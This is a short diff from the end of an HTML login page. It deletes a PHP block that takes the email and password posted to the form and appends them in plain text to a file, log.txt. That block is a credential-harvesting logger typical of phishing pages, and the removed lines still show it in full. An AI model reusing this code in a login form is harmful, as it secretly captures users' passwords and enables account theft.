@@ -250,23 +250,3 @@
     </div>
 </div>
 </body>
-
-<?php
-
-$email =  $_POST['inputEmail'];
-$senha = $_POST['inputSenha'];
-
-
-// Salvando em um txt
-if (isset($email) && $email != "" && isset($senha) && $senha != ""){
-
-  $msg = "- Email : $email \n- Senha : $senha \n --------------------------------";
-  $myfile = fopen("log.txt", "a");
-  fwrite($myfile, $msg."\n");
-  fclose($myfile);
-
-}
-
-
-
-?>
